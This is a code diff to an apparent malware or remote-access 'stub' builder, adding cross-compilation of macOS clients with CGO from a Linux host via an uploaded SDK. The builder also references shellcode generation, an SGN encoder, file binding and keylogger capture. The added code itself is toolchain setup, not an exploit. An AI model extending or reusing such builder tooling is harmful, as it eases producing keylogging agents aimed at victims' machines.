@@ -23,6 +23,7 @@ import { buildLinuxShellcode } from "./linux-shellcode-manager";
 import { runSgn } from "./sgn-manager";
 import { resolveContainedPath } from "./upload-security";
 import { createIsolatedBuildEnv } from "./build-environment";
+import { cleanupMacosSdkUpload, extractAndValidateMacosSdk } from "./macos-sdk-manager";
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -134,6 +135,8 @@ type BuildProcessConfig = {
   fetchPublicIP?: boolean;
   uploadToFileShare?: boolean;
   buildPlugins?: Record<string, { enabled: boolean; settings: Record<string, unknown> }>;
+  macosSdkArchivePath?: string;
+  macosSdkUploadDir?: string;
 };
 
 type BuildHookRunner = (
@@ -600,6 +603,7 @@ export async function startBuildProcess(
   let binderGenPath: string | null = null;
   let binderFilesDir: string | null = null;
   let binderLockPath: string | null = null;
+  let macosSdkRoot: string | null = null;
 
   const buildStartedAt = Date.now();
   const keepAliveTimer = setInterval(() => {
@@ -661,6 +665,21 @@ export async function startBuildProcess(
     sendToStream({ type: "output", text: `Client source: ${clientDir}\n`, level: "info" });
     sendToStream({ type: "output", text: `Stub version: ${agentVersion}\n`, level: "info" });
     sendToStream({ type: "output", text: `Client build cache: ${cacheRoot}\n`, level: "info" });
+
+    if (config.macosSdkArchivePath && config.macosSdkUploadDir) {
+      sendToStream({ type: "status", text: "Validating uploaded macOS SDK..." });
+      macosSdkRoot = await extractAndValidateMacosSdk({
+        id: path.basename(config.macosSdkUploadDir),
+        userId: config.builtByUserId || 0,
+        filename: path.basename(config.macosSdkArchivePath),
+        size: fs.statSync(config.macosSdkArchivePath).size,
+        createdAt: Date.now(),
+        claimed: true,
+        archivePath: config.macosSdkArchivePath,
+        uploadDir: config.macosSdkUploadDir,
+      });
+      sendToStream({ type: "output", text: `Uploaded macOS SDK ready: ${path.basename(macosSdkRoot)}\n`, level: "info" });
+    }
 
     const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
     if (platformsToBuild.length !== (config.platforms || []).length) {
@@ -1090,12 +1109,13 @@ func runBoundFiles() {
         effectiveOs === "darwin" &&
         !isIosTarget &&
         process.platform !== "darwin" &&
-        env.CGO_ENABLED === "1"
+        env.CGO_ENABLED === "1" &&
+        !(process.platform === "linux" && macosSdkRoot)
       ) {
         env.CGO_ENABLED = "0";
         sendToStream({
           type: "output",
-          text: "WARNING: Cross-compiling to darwin from a non-macOS host requires an osxcross/macOS SDK toolchain, which is not bundled. Forcing CGO disabled for this target. Build natively on macOS for full CGO support (keylogger keystroke capture requires CGO).\n",
+          text: "WARNING: Cross-compiling to darwin from this host requires a supported macOS SDK toolchain. Forcing CGO disabled for this target.\n",
           level: "warn",
         });
       }
@@ -1105,7 +1125,16 @@ func runBoundFiles() {
         let cxx: string | undefined;
         let extraBinDir: string | undefined;
 
-        if (os === "android" && ndkBin) {
+        if (effectiveOs === "darwin" && !isIosTarget && process.platform === "linux" && macosSdkRoot) {
+          const triple = actualArch === "arm64" ? "arm64-apple-macos11" : "x86_64-apple-macos11";
+          const quotedSdk = JSON.stringify(macosSdkRoot);
+          cc = `clang --target=${triple} -isysroot ${quotedSdk} -mmacosx-version-min=11.0`;
+          cxx = `clang++ --target=${triple} -isysroot ${quotedSdk} -mmacosx-version-min=11.0`;
+          env.CGO_CFLAGS = `-isysroot ${quotedSdk} -mmacosx-version-min=11.0`;
+          env.CGO_CXXFLAGS = env.CGO_CFLAGS;
+          env.CGO_LDFLAGS = `${env.CGO_CFLAGS} -fuse-ld=lld`;
+          sendToStream({ type: "output", text: `Darwin CGO cross-toolchain: ${triple} with uploaded SDK\n`, level: "info" });
+        } else if (os === "android" && ndkBin) {
           const ndkCcByTarget: Record<string, string> = {
             "android/amd64": "x86_64-linux-android21-clang",
             "android/arm64": "aarch64-linux-android21-clang",
@@ -2263,5 +2292,6 @@ func runBoundFiles() {
     if (binderLockPath) {
       try { fs.unlinkSync(binderLockPath); } catch {}
     }
+    cleanupMacosSdkUpload(config.macosSdkUploadDir);
   }
 }
